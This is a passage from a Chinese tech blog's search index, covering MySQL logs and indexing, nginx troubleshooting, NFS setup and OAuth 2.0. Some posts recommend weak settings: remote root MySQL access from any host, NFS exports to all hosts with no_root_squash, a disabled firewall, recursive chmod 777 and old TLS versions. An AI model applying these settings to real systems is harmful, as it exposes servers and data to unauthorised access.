","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/mysql%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95/","series":["Manual"],"tags":["MySQL"],"title":"MySQL前缀索引"},{"categories":["编程思想"],"content":"日志是mysql数据库的重要组成部分，记录着数据库运行期间各种状态信息。mysql日志主要包括错误日志、查询日志、慢查询日志、事务日志、二进制日志几大类。作为开发，我们重点需要关注的是二进制日志(binlog)和事务日志(包括redo log和undo log)，本文接下来会详细介绍这三种日志。其他几种日志见 👉 [玩转MySQL之八]MySQL日志分类及简介 1. binlog binlog用于记录数据库执行的写入性操作(不包括查询)信息，以二进制的形式保存在磁盘中。binlog是mysql的逻辑日志，并且由Server层进行记录，使用任何存储引擎的mysql数据库都会记录binlog日志。\n 逻辑日志：可以简单理解为记录的就是sql语句。\n  物理日志：因为mysql数据最终是保存在数据页中的，物理日志记录的就是数据页变更。\n binlog是通过追加的方式进行写入的，可以通过max_binlog_size参数设置每个binlog文件的大小，当文件大小达到给定值之后，会生成新的文件来保存日志。\n1.1 binlog使用场景 在实际应用中，binlog的主要使用场景有两个，分别是主从复制和数据恢复。\n 主从复制：在Master端开启binlog，然后将binlog发送到各个Slave端，Slave端重放binlog从而达到主从数据一致。 数据恢复：通过使用mysqlbinlog工具来恢复数据。  1.2 binlog刷盘时机 对于InnoDB存储引擎而言，只有在事务提交时才会记录biglog，此时记录还在内存中，那么biglog是什么时候刷到磁盘中的呢？mysql通过sync_binlog参数控制biglog的刷盘时机，取值范围是0-N：\n 0：不去强制要求，由系统自行判断何时写入磁盘； 1：每次commit的时候都要将binlog写入磁盘； N：每N个事务，才会将binlog写入磁盘。  从上面可以看出，sync_binlog最安全的是设置是1，这也是MySQL 5.7.7之后版本的默认值。但是设置一个大一些的值可以提升数据库性能，因此实际情况下也可以将值适当调大，牺牲一定的一致性来获取更好的性能。\n1.3 binlog日志格式 binlog日志有三种格式，分别为STATMENT、ROW和MIXED。\n 在 MySQL 5.7.7之前，默认的格式是STATEMENT，MySQL 5.7.7之后，默认值是ROW。日志格式通过binlog-format指定。\n  STATMENT 基于SQL语句的复制(statement-based replication, SBR)，每一条会修改数据的sql语句会记录到binlog中。 优点：不需要记录每一行的变化，减少了binlog日志量，节约了IO, 从而提高了性能； 缺点：在某些情况下会导致主从数据不一致，比如执行sysdate()、slepp()等。 ROW 基于行的复制(row-based replication, RBR)，不记录每条sql语句的上下文信息，仅需记录哪条数据被修改了。 优点：不会出现某些特定情况下的存储过程、或function、或trigger的调用和触发无法被正确复制的问题； 缺点：会产生大量的日志，尤其是alter table的时候会让日志暴涨 MIXED 基于STATMENT和ROW两种模式的混合复制(mixed-based replication, MBR)，一般的复制使用STATEMENT模式保存binlog，对于STATEMENT模式无法复制的操作使用ROW模式保存binlog  2. redo log 2.1 为什么需要redo log 我们都知道，事务的四大特性里面有一个是 持久性，具体来说就是只要事务提交成功，那么对数据库做的修改就被永久保存下来了，不可能因为任何原因再回到原来的状态。那么mysql是如何保证持久性的呢？最简单的做法是在每次事务提交的时候，将该事务涉及修改的数据页全部刷新到磁盘中。但是这么做会有严重的性能问题，主要体现在两个方面：\n 因为Innodb是以页为单位进行磁盘交互的，而一个事务很可能只修改一个数据页里面的几个字节，这个时候将完整的数据页刷到磁盘的话，太浪费资源了！ 一个事务可能涉及修改多个数据页，并且这些数据页在物理上并不连续，使用随机IO写入性能太差！  因此mysql设计了redo log，具体来说就是只记录事务对数据页做了哪些修改，这样就能完美地解决性能问题了(相对而言文件更小并且是顺序IO)。MySQL实战45讲 中将redo log比作临时记账的粉板，实际数据页比作账本。\n2.2 redo log基本概念 redo log包括两部分：一个是内存中的日志缓冲(redo log buffer)，另一个是磁盘上的日志文件(redo log file)。mysql每执行一条DML语句，先将记录写入redo log buffer，后续某个时间点再一次性将多个操作记录写到redo log file。这种先写日志，再写磁盘的技术就是MySQL里经常说到的WAL(Write-Ahead Logging) 技术。\n在计算机操作系统中，用户空间(user space)下的缓冲区数据一般情况下是无法直接写入磁盘的，中间必须经过操作系统内核空间(kernel space)缓冲区(OS Buffer)。因此，redo log buffer写入redo log file实际上是先写入OS Buffer，然后再通过系统调用fsync()将其刷到redo log file中，过程如下：\nmysql支持三种将redo log buffer写入redo log file的时机，可以通过innodb_flush_log_at_trx_commit参数配置，各参数值含义如下：\n   参数值 含义     0（延迟写） 事务提交时不会将redo log buffer中日志写入到os buffer，而是每秒写入os buffer并调用fsync()写入到redo log file中。也就是说设置为0时是(大约)每秒刷新写入到磁盘中的，当系统崩溃，会丢失1秒钟的数据。   1（实时写，实时刷） 事务每次提交都会将redo log buffer中的日志写入os buffer并调用fsync()刷到redo log file中。这种方式即使系统崩溃也不会丢失任何数据，但是因为每次提交都写入磁盘，IO的性能较差。   2（实时写，延迟刷） 每次提交都仅写入到os buffer，然后是每秒调用fsync()将os buffer中的日志写入到redo log file。    2.3 redo log记录形式 前面说过，redo log实际上记录数据页的变更，而这种变更记录是没必要全部保存，因此redo log实现上采用了大小固定，循环写入的方式，当写到结尾时，会回到开头循环写日志。如下图：\n同时我们很容易得知，在innodb中，既有redo log需要刷盘，还有数据页也需要刷盘，redo log存在的意义主要就是降低对数据页刷盘的要求。在上图中，write pos表示redo log当前记录的LSN(逻辑序列号)位置，check point表示数据页更改记录刷盘后对应redo log所处的LSN(逻辑序列号)位置。write pos到check point之间的部分是redo log空着的部分，用于记录新的记录；check point到write pos之间是redo log待落盘的数据页更改记录。当write pos追上check point时，会先推动check point向前移动，空出位置再记录新的日志。\n启动innodb的时候，不管上次是正常关闭还是异常关闭，总是会进行恢复操作。因为redo log记录的是数据页的物理变化，因此恢复的时候速度比逻辑日志(如binlog)要快很多。 重启innodb时，首先会检查磁盘中数据页的LSN，如果数据页的LSN小于日志中的LSN，则会从checkpoint开始恢复。 还有一种情况，在宕机前正处于checkpoint的刷盘过程，且数据页的刷盘进度超过了日志页的刷盘进度，此时会出现数据页中记录的LSN大于日志中的LSN，这时超出日志进度的部分将不会重做，因为这本身就表示已经做过的事情，无需再重做。\n2.4 redo log与binlog区别     redo log binlog     文件大小 redo log的大小是固定的。 binlog可通过配置参数max_binlog_size设置每个binlog文件的大小。   实现方式 redo log是InnoDB引擎层实现的，并不是所有引擎都有。 binlog是Server层实现的，所有引擎都可以使用 binlog日志   记录方式 redo log 采用循环写的方式记录，当写到结尾时，会回到开头循环写日志。 binlog 通过追加的方式记录，当文件大小大于给定值后，后续的日志会记录到新的文件上   适用场景 redo log适用于崩溃恢复(crash-safe) binlog适用于主从复制和数据恢复    由binlog和redo log的区别可知：binlog日志只用于归档，只依靠binlog是没有crash-safe能力的。但只有redo log也不行，因为redo log是InnoDB特有的，且日志上的记录落盘后会被覆盖掉。因此需要binlog和redo log二者同时记录，才能保证当数据库发生宕机重启时，数据不会丢失。\n 问：binlog为什么没有crash_safe的能力呢？binlog日志也记录了所有的操作。\n答：不考虑mysql现有的实现，假如现在重新设计mysql，只用一个binlog是否可以实现cash_safe能力呢？答案是可以的，只不过binlog中也要加入checkpoint，数据库故障重启后，binlog checkpoint之后的sql都重放一遍。但是这样做让binlog耦合的功能太多。\n 3. undo log 数据库事务四大特性中有一个是 原子性，具体来说就是 原子性是指对数据库的一系列操作，要么全部成功，要么全部失败，不可能出现部分成功的情况。实际上，原子性底层就是通过undo log实现的。undo log主要记录了数据的逻辑变化，比如一条INSERT语句，对应一条DELETE的undo log，对于每个UPDATE语句，对应一条相反的UPDATE的undo log，这样在发生错误时，就能回滚到事务之前的数据状态。同时，undo log也是MVCC(多版本并发控制)实现的关键，这部分内容在面试中的老大难-mysql事务和锁，一次性讲清楚！ 中有介绍，不再赘述。\n附件 MySQL 的逻辑架构图：  mysql8.0之后删除了查询缓存模块\n update 语句执行流程： redo log的写入分成两个步骤prepare和commit，这就是两阶段提交\n 问：两阶段提交中，MySQL异常重启（crash），是如何保证数据完整性的？\n答：\n 在上图时刻A中，也就是写入redo log处于prepare阶段以后、写binlog之前，发生了崩溃（crash）：由于此时binlog还没写，redo log也还没提交（commit），所以崩溃恢复的时候，这个事务会回滚。这时候，binlog还没写，所以也不会传到备库，数据一致； 在上图时刻B中，也就是写完binlog之后，发生crash：如果redo log里面的事务有commit标识（事务是完整的）则直接提交；如果redo log里面的事务只有prepare没有commit，则判断对应的事务在binlog是否存在并完整，完整则提交事务，否则回滚事务； MySQL怎么知道binlog是完整的：一个事务的binlog是有完整格式的，statement格式（记录sql语句），最后会有个COMMIT; row格式（记录行的内容，记两条，更新前和更新后都有），最后会有个XID event redo log和binlog是怎么关联起来的：他们有一个共同的数据字段XID。崩溃恢复的时候，会按顺序扫描redo log；上述第二点中的崩溃恢复场景（redo log里面的事务只有完整的prepare而没有commit），那么mysql就会拿着XID去binlog找是否存在对应的完整事务；   参考 必须了解的mysql三大日志-binlog、redo log和undo log [玩转MySQL之八]MySQL日志分类及简介 01 | 基础架构：一条SQL查询语句是如何执行的？ 02 | 日志系统：一条SQL更新语句是如何执行的？ 为什么有binlog还要redo log ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/mysql%E6%97%A5%E5%BF%97/","series":["Manual"],"tags":["MySQL"],"title":"MySQL日志"},{"categories":["编程思想"],"content":"索引是一种加快查询的数据结构，在 MySQL 中，索引的数据结构选择的是 B+Tree，至于 B+Tree 是什么以及为什么 MySQL 为什么选择 B+Tree 来作为索引，可以去查看公众号的前三篇文章。\n  索引数据结构之 B-Tree 与 B+Tree（上篇）   索引数据结构之 B-Tree 与 B+Tree（下篇）   MySQL 为什么不用数组、哈希表、二叉树等数据结构作为索引呢   今天主要来聊聊 MySQL 中索引的工作原理，这一部分的知识，在工作中经常被使用到，在面试中也几乎是必问的。所以，不管是面试造火箭，还是工作拧螺丝，掌握索引的工作原理，都是十分有必要的。\n首先需要说明的是，本文的所有讨论均是基于 InnoDB 存储引擎为前提。\n示例表 为了方便说明，我们先创建一个示例表。建表语句如下\nCREATE TABLE user ( `id` BIGINT ( 11 ) NOT NULL AUTO_INCREMENT, `name` VARCHAR ( 64 ) COMMENT \u0026#39;姓名\u0026#39;, `age` INT ( 4 ) COMMENT \u0026#39;年龄\u0026#39;, PRIMARY KEY ( `id` ), INDEX ( NAME ) ) ENGINE = INNODB COMMENT \u0026#39;用户表\u0026#39;; INSERT INTO `user` ( `name`, `age` ) VALUES ( \u0026#39;AA\u0026#39;, 30 ),( \u0026#39;BB\u0026#39;, 33 ),( \u0026#39;CC\u0026#39;, 31 ),( \u0026#39;DD\u0026#39;, 30 ),( \u0026#39;EE\u0026#39;, 29 ) 在上面的 SQL 语句中，创建了一张 user 表，表中有三个字段，id 是主键，name 和 age 分别表示用户的姓名和年龄，同时还为字段 name 创建了一个普通索引。为了方便后面描述，因此还向表中插入了 5 条数据，由于主键 id 是自增的，所以这五行数据的 id 值分为是 1~5。\n主键索引 主键索引又称之为聚簇索引（cluster index），它的特点是叶子结点中会存放当前主键所对应行的数据。什么意思呢？拿上面的例子来说明，在表 user 中，id 为主键索引，所以会有一棵 id 的索引树，在该索引树的叶子结点中，不仅存放了主键 id 的值，还存放了 name 和 value 的值。例如：在 id=1 这一行的数据中，name 和 age 的值为 AA 和 30，那么在索引树中，在 id=1 的结点处，存放的是(1,\u0026ldquo;AA\u0026rdquo;,30)这三个值。id 索引树的示意图如下。\n下面看看这一条 SQL 语句的执行流程：\nselect * from user where id = 1; 该语句在 where 条件中加了 id=1 这个过滤条件，因此会使用到主键 id 的索引树。\n 选择使用 id 主键索引树； 找到 id 索引树的第一层结点（关键字 3、7 所在的结点），由于 where 条件中 id=1，1 小于 3，所以进入到关键字 3 的左子树中查找； 进入到 id 索引树的第二层结点，第二层结点是叶子结点，叶子结点中存放了表的数据，并且存在 id=1 的关键字，所以将 R1 返回。（R1 表示的是 id=1 这一行的数据）。  回表 普通索引又称之为非聚簇索引，也叫做二级索引，它的特点是叶子结点中也会存放数据，与主键索引不同的是，普通索引中存放的数据只有主键的值，而非整行记录的数据。例如上面的示例表中，name 就是一个普通索引，它的索引树中，在叶子结点中存放的数据是主键 id 的值，示意图如下：\n下面看看这一条 SQL 语句的执行流程：\nselect * from user where name = \u0026#39;BB\u0026#39;; 该语句在 where 条件中加了 name=\u0026lsquo;BB\u0026rsquo;这个过滤条件，由于我们在建表时为 name 字段创建了索引，因此会使用到 name 这棵索引树。另外，由于我们使用的是 select * ，也就是查询表中的所有字段的值，但是 name 索引树中只存有主键 id 的值，无法满足要查询所有字段的需求，而所有字段的数据都是存放在主键 id 索引树上的，因此在 name 索引树上查到主键 id 的值后，还需要根据查到的 id 值，再去主键索引树上查找这一行记录中其他字段的值，这个过程我们称之为回表。（从普通索引树回到主键索引树搜索的过程就叫做回表）。 所以上面的 SQL 语句的执行流程如下：\n 选择使用 name 索引树； 找到索引树的第一层结点，由于 where 条件中\u0026rsquo;BB\u0026rsquo;的值小于第一层结点中关键字\u0026rsquo;CC\u0026rsquo;的值，索引进入到关键字\u0026rsquo;CC\u0026rsquo;的左子树中查找； 进入到第二层的叶子结点，找到关键字\u0026rsquo;BB\u0026rsquo;，由于叶子结点中存放了主键 id 的数据，所以返回\u0026rsquo;BB\u0026rsquo;中主键 id 的值 2； 根据主键 id=2，再去主键 id 的索引树中查找，找到 id=2 所对应的数据 R2； 在 name 索引树中继续向后查找，找到\u0026rsquo;BB\u0026rsquo;的下一个关键字\u0026rsquo;CC'，发现\u0026rsquo;CC\u0026rsquo;不等于 where 条件中的\u0026rsquo;BB'，所以结束查找。  覆盖索引 对于上面的第二个例子，由于 name=\u0026lsquo;BB\u0026rsquo;的只有一条记录，因此只回了一次表，那如果有多条记录同时满足 name=\u0026lsquo;BB\u0026rsquo;这个条件，那就得进行多次回表操作了。显然，回表次数越多，SQL 执行的越慢，那有什么办法能避免回表呢？答案就是覆盖索引。\n覆盖索引究竟是个什么东西呢？在上面的第二个示例中，我们使用了 select * 来查询所有字段，那如果我们并不需要所有的字段呢，只需要 id 字段呢？例如 select id from user where name = 'BB'; 由于在 name 索引树的叶子结点中已经存有了主键 id 的值，所以 name 索引树能直接满足我们的查询要求，因此此时是不要回表操作，这种情况我们称之为覆盖索引。\n覆盖索引能够显著的提升查询性能，因为它能明显减少大量的回表操作。覆盖索引是非常常用的一种 SQL 优化手段，使用起来也十分简单。我们在开发过程中，通常建议不要使用 select * 来查询数据，一方面是因为在数据量大时，select * 可能会返回好多无用字段，浪费网络资源；另一方面也是出于尽量使用覆盖索引的考虑。\n联合索引与最左匹配原则 假如我们现在有个需求是要查询 user 表中，name=\u0026lsquo;BB\u0026rsquo;的人的 name 和 age，我们的 SQL 需要这样写：\nselect name,age from user where name = \u0026#39;BB\u0026#39;; 显然，此时也会使用到 name 索引树，又因为 name 索引树中并没有存放 age 字段的信息，因此需要进行回表，回到主键 id 的索引树中取 age 字段的值。那么有什么方法能优化一下呢？让这次查询不需要进行回表。肯定有啊！使用覆盖索引啊。怎么用呢？\n我们在创建 name 索引的时候，实际上创建的是单列索引（只选用了 name 这一列），而在 MySQL 中，我们是可以在创建索引时，选择多个列进行索引创建，这一类索引我们称之为联合索引。例如：我们现在为 name 字段和 age 字段创建一个联合索引，执行语句如下：\n# 为了不影响测试，我们先将之前的name字段的索引删除 alter table user drop index `name`; # 创建name、age的联合索引 alter table user add index(`name`,`age`); 这个时候，这个联合索引的索引树上，每个结点上存放的不仅仅只有 name 字段的值了，还有 age 字段的值，示意图如下：\n那么这个时候，当我们 select name,age from user where name = 'BB' 时，由于需要的 name 字段和 age 字段在这棵联合索引树上已经存在了，所以这次查询不需要回表。\n在使用联合索引时，索引的每一列只能做等值判断，因为 MySQL 会使用最左匹配原则进行匹配，也就是从索引最左边的列开始连续匹配，在碰到范围查找时会停止匹配，如遇到 like、\u0026gt;、\u0026lt;、between 等范围查找。可以结合下面三个示例来理解一下。\nselect name,age from user where name = \u0026#39;BB\u0026#39; and age = 33; # 在使用联合索引时，会依次匹配name列和age列。 select name,age from user where name like \u0026#39;B%\u0026#39; and age = 33; # 在使用联合索引时，当匹配到name这一列的时候，由于name使用了like范围查找，因此后面不会再匹配age这一列了。 select name,age from user where age = 33; # 在使用联合索引时，由于联合索引的最左列为name列，而我们在where条件中匹配的是age列，因此不满足最左匹配原则，所以该条SQL会进行该联合索引的全表扫描。 为什么 MySQL 要遵循最左匹配原则呢？这是因为 B+Tree 中，所有节点上的数据是有序的，当我们创建联合索引时，首先保证的是所有数据的第一列是有序的，然后再保证第二列、第三列以及后面的列有序。以上面的 user 表中的联合索引为例，在该索引树中，name 这一列在所有数据上是有序的，但是 age 这一列，却不是有序的，只有对于 name 相同的情况的下，age 才有序。当我们在查找数据时，如果碰到范围查找的时候，由于后面的列没法保证是有序的，所以不能再继续进行等值匹配，只能对后面的列进行全表扫描。\n总结 本文主要讲了一条查询 SQL 语句是如何通过索引来查询数据的，以及什么是回表。在使用索引时，为了提升查询性能，可以通过创建合理的索引，使用覆盖索引来减少回表操作，从而达到提升查询性能的目的。最后，在联合索引的使用中，由于最左匹配原则，需要注意索引列的顺序，在创建联合索引时，需要考虑好如何安排索引内字段的顺序，以满足更多的查询场景，避免创建多个索引。\n参考 MySQL索引的工作原理 索引数据结构之B-Tree与B+Tree（上篇） 索引数据结构之B-Tree与B+Tree（下篇） MySQL为什么不用数组、哈希表、二叉树等数据结构作为索引呢 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/mysql%E7%B4%A2%E5%BC%95%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","series":["Manual"],"tags":["MySQL"],"title":"MySQL索引的工作原理"},{"categories":["其他"],"content":"navicat远程连接mysql，2003 can\u0026rsquo;t connect to mysql server on 10038\n首先我们通过\n①：netstat -an|grep 3306\n来查看mysql默认的端口3306是否开启，允许哪个ip使用，如果你发现，前面有127.0.0.1，就说明，3306端口只能本机ip使用\n所以，我们需要\n②：打开mysql配置文件vi /etc/mysql/mysql.conf.d/mysqld.cnf\n将bind-address = 127.0.0.1注销\n③：进入mysql，对远程用户进行授权，\ngrant all privileges on . to \u0026lsquo;root\u0026rsquo;@'%' identified by \u0026lsquo;xxxxxx\u0026rsquo;;\n这里的root 是你远程登录的用户，xxxxxx是你登录使用的密码，然后可以在mysql数据 表中查看到你这个用户已经被添加到user表中\n④：service mysql restart\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/navicat%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5mysql2003-can_t-connect-to-mysql-serve/","series":["Manual"],"tags":["Other"],"title":"navicat远程连接mysql，2003 can't connect to mysql server on 10038"},{"categories":["其他"],"content":"net::ERR_CONTENT_LENGTH_MISMATCH 200 (OK)\n加载静态资源时报错：net::ERR_CONTENT_LENGTH_MISMATCH 200 (OK)\n解决办法：调整缓冲区大小 proxy_buffer_size 64k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k;\nserver { listen 80; server_name tkaid.com www.tkaid.com; location / { proxy_buffer_size 64k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_pass http://k8s_tkb-web-svc; } } 如果仍然报这个错，可以再将值设置得大一点。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/net__err_content_length_mismatch-200-ok/","series":["Manual"],"tags":["Other"],"title":"net::ERR_CONTENT_LENGTH_MISMATCH 200 (OK)"},{"categories":["云原生"],"content":"nfs安装\n1. 环境说明    角色 ip os     NFS 服务端 172.31.0.12 CentOS 7.6   NFS 客户端 172.18.0.7 CentOS 7.6    2. NFS 服务端 2.1 安装 nfs-utils # rpcbind 作为依赖会自动安装。 \u0026gt; yum install nfs-utils 2.2 配置并启动服务 允许rpcbind.service、nfs.service开机自启：\n# 启动相关服务 \u0026gt; systemctl start rpcbind \u0026gt; systemctl start nfs 防火墙允许服务通过：\n# 防火墙允许服务通过 \u0026gt; firewall-cmd --zone=public --permanent --add-service={rpc-bind,mountd,nfs} success \u0026gt; firewall-cmd --reload success 或者直接关闭防火墙：systemctl stop firewalld\n2.3 配置共享目录 例如需要共享的目录为/mnt/nfs/：\n# 创建 /mnt/kvm 并修改权限 \u0026gt; cd /mnt /mnt \u0026gt; mkdir nfs /mnt \u0026gt; chmod 755 nfs # 验证目录权限 /mnt \u0026gt; ls -l total 0 drwxr-xr-x 2 root root 59 Oct 17 17:49 nfs 之后修改/etc/exports，将/mnt/nfs/添加进去：\n\u0026gt; cat /etc/exports # 1. 只允许 abelsu7-ubuntu 访问 /mnt/nfs/ abelsu7-ubuntu(rw,sync,no_root_squash,no_all_squash) # 2. 根据 IP 地址范围限制访问 /mnt/nfs/ 172.0.0.0/8(rw,sync,no_root_squash,no_all_squash) # 3. 使用 * 表示访问不加限制 /mnt/nfs/ *(rw,sync,no_root_squash,no_all_squash) 关于/etc/exports中的参数含义：\n /mnt/kvm/：需要共享的目录 172.0.0.0/8：客户端 IP 范围，*表示无限制 rw：权限设置，可读可写 sync：表示文件同时写入硬盘和内存 no_root_squash：当登录 NFS 主机使用共享目录的使用者是 root 时，其权限将被转换成为匿名使用者，通常它的 UID 与 GID，都会变成 nobody 身份 no_all_squash：可以使用普通用户授权（？？）  保存之后，重启nfs服务：\n\u0026gt; systemctl restart nfs 2.4 查看共享目录列表 [root@VM-0-12-centos mnt]# showmount -e localhost Export list for localhost: /mnt/nfs 172.0.0.0/8 3. NFS 客户端 3.1 安装 nfs-utils # CentOS/Fedora, etc. \u0026gt; yum install nfs-utils # Ubuntu/Debian, etc. \u0026gt; apt install nfs-common 必须要安装nfs-utils，安装过程会下载关键命令到本机，例如showmount等等。\n3.2 配置并启动服务（非必须步骤）  开启rpcbind服务不是必须的，经过实测只要安装了nfs-utils到本机，就可以实现挂载。\n 设置rpcbind服务开机启动：\n\u0026gt; systemctl enable rpcbind 启动rpcbind：\n\u0026gt; systemctl start rpcbind 客户端不需要打开防火墙，也不需要开启 NFS 服务\n3.3 挂载共享目录 先查看服务端的共享目录：\n[root@k8s-node1 mnt]# showmount -e 172.31.0.12 Export list for 172.31.0.12: /mnt/nfs 172.0.0.0/8 在客户端创建并挂载对应目录：\n\u0026gt; mkdir -p /mnt/nfs \u0026gt; mount -t nfs 172.31.0.12:/mnt/nfs /mnt/nfs 最后检查一下是否挂载成功：\n[root@k8s-node1 mnt]# df -hT /mnt/nfs Filesystem Type Size Used Avail Use% Mounted on 172.31.0.12:/mnt/nfs nfs4 493G 72M 467G 1% /mnt/nfs [root@k8s-node1 mnt]# mount | grep /mnt/nfs 172.31.0.12:/mnt/nfs on /mnt/nfs type nfs4 (rw,relatime,vers=4.1,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=172.18.0.7,local_lock=none,addr=172.31.0.12) 3.4 配置自动挂载 在客户端编辑/etc/fstab，加入如下配置：\n172.31.0.12:/mnt/nfs /mnt/nfs nfs defaults 0 0 最后重新加载systemctl，即可实现重启后自动挂载\n\u0026gt; systemctl daemon-reload 4. NFS 读写速度测试 写速度：\n[root@k8s-node1 mnt]# time dd if=/dev/zero of=/mnt/nfs/jenkins.war bs=8k count=1024 1024+0 records in 1024+0 records out 8388608 bytes (8.4 MB) copied, 0.122319 s, 68.6 MB/s real\t0m0.138s user\t0m0.000s sys\t0m0.008s 读速度：\n[root@k8s-node1 mnt]# time dd if=/mnt/nfs/jenkins.war of=/dev/null bs=8k count=1024 1024+0 records in 1024+0 records out 8388608 bytes (8.4 MB) copied, 0.0020144 s, 4.2 GB/s real\t0m0.004s user\t0m0.000s sys\t0m0.002s 参考连接 CentOS 7 安装配置 NFS ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/nfs%E5%AE%89%E8%A3%85/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"nfs安装"},{"categories":["其他"],"content":"nginx 访问 .php文件变成下载(chrome) 或者直接显示源码(edge)\n原因：这是因为nginx没有设置好碰到php文件时，要传递到后方的php解释器。\n需要在nginx.conf的server{}添加如下内容：\nlocation ~ [^/]\\.php(/|$) { #fastcgi_pass remote_php_ip:9000; fastcgi_pass unix:/dev/shm/php-cgi.sock; fastcgi_index index.php; include fastcgi.conf; } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/nginx-%E8%AE%BF%E9%97%AE-.php%E6%96%87%E4%BB%B6%E5%8F%98%E6%88%90%E4%B8%8B%E8%BD%BDchrome-%E6%88%96%E8%80%85%E7%9B%B4%E6%8E%A5%E6%98%BE%E7%A4%BA%E6%BA%90%E7%A0%81edge/","series":["Manual"],"tags":["WordPress"],"title":"nginx 访问 .php文件变成下载(chrome) 或者直接显示源码(edge)"},{"categories":["其他"],"content":"nginx反向代理kibana报：Kibana did not load properly.Check the server output for more information.\n如题所述，直接访问5601端口不会报错，一旦用ngnix反向代理就报错。\n原因：应该是kibana的启动用户没有访问nginx/proxy_temp文件夹的权限，导致部分静态资源无法加载。\n 奇怪的是：1. 我的proxy_temp文件下一个文件都没有 2. 我的nginx error.log日志也没有报类似Permission denied的错误。 这里暂且不管。。。\n 解决办法:\nchmod -R 777 proxy_temp https://www.cnblogs.com/operationhome/p/9901580.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86kibana%E6%8A%A5kibana-did-not-load-properly.chec/","series":["Manual"],"tags":["Other"],"title":"nginx反向代理kibana报：Kibana did not load properly.Check the server output for more information."},{"categories":["编程思想"],"content":"在给nginx加上授权模块后，再访问应用报403访问禁止的错误。\n一开始是这样：\n1. 生成密码文件 printf \u0026#34;yourusername:$(openssl passwd -apr1)\u0026#34; \u0026gt; /etc/nginx/passwords 2. nginx配置 server { # ... auth_basic \u0026#34;Protected\u0026#34;; auth_basic_user_file passwords; # ... } [v_error]auth_basic_user_file 后面跟的是相对路径，这样配置很容易导致nginx找不到文件，因此改成绝对路径就万事大吉了：[/v_error]\nserver{\tlisten 443 ssl; server_name netdata.6and.ltd; #listen [::]:81 default_server ipv6only=on; #ssl on; ssl_certificate httpssl/1_netdata.6and.ltd_bundle.crt; ssl_certificate_key httpssl/2_netdata.6and.ltd.key; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; #index index.html index.htm index.php; #root /home/wwwroot/; #error_page 404 /404.html; #include enable-php.conf; auth_basic \u0026#34;Protected\u0026#34;; auth_basic_user_file /usr/local/nginx/passwords; location / { proxy_pass http://127.0.0.1:19999; } access_log /data/wwwlogs/netdata.log; } server { listen 80; server_name netdata.6and.ltd; #把http的域名请求转成https return 301 https://$host$request_uri; } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/nginx%E6%8E%88%E6%9D%83%E7%99%BB%E9%99%86%E6%8A%A5403%E9%97%AE%E9%A2%98/","series":["Manual"],"tags":["nginx"],"title":"nginx授权登陆报403问题"},{"categories":["计算机科学"],"content":"OAuth（开放授权）是一个开放标准，允许用户授权第三方移动应用访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方移动应用或分享他们数据的所有内容，OAuth2.0是OAuth协议的延续版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。\n客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。\n 授权码模式（authorization code） 简化模式（implicit） 密码模式（resource owner password credentials） 客户端模式（client credentials）  1. 名词定义 在详细讲解OAuth 2.0之前，需要了解几个专用名词。\n（1） Third-party application：第三方应用程序，本文中又称\u0026quot;客户端\u0026quot;（client），即上一节例子中的\u0026quot;云冲印\u0026quot;。\n（2）HTTP service：HTTP服务提供商，本文中简称\u0026quot;服务提供商\u0026quot;，即上一节例子中的Google。\n（3）Resource Owner：资源所有者，本文中又称\u0026quot;用户\u0026quot;（user）。\n（4）User Agent：用户代理，本文中就是指浏览器。\n（5）Authorization server：认证服务器，即服务提供商专门用来处理认证的服务器。\n（6）Resource server：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。\n知道了上面这些名词，就不难理解，OAuth的作用就是让\u0026quot;客户端\u0026quot;安全可控地获取\u0026quot;用户\u0026quot;的授权，与\u0026quot;服务商提供商\u0026quot;进行互动。\n2. 四种模式区别 授权码模式没什么好讲的，应用最广泛，是标准的OAuth2模式；\n简化模式适合没有后端的应用，也就无法安全的存储client id 和 client secret 例如只有一个页面的h5调查问卷等等；\n密码模式是用户把账号密码直接告诉客户端，非常不安全，适用于遗留项目升级为oauth2的适配方案、客户端是自家的应用；\n客户端模式直接根据client的id和密钥即可获取token，无需用户参与，适用于后端服务调后端服务；\n参考链接： 理解OAuth 2.0 oauth2四种授权方式小结 [简易图解]『 OAuth2.0』 『进阶』 授权模式总结 OAuth2.0的四种授权模式 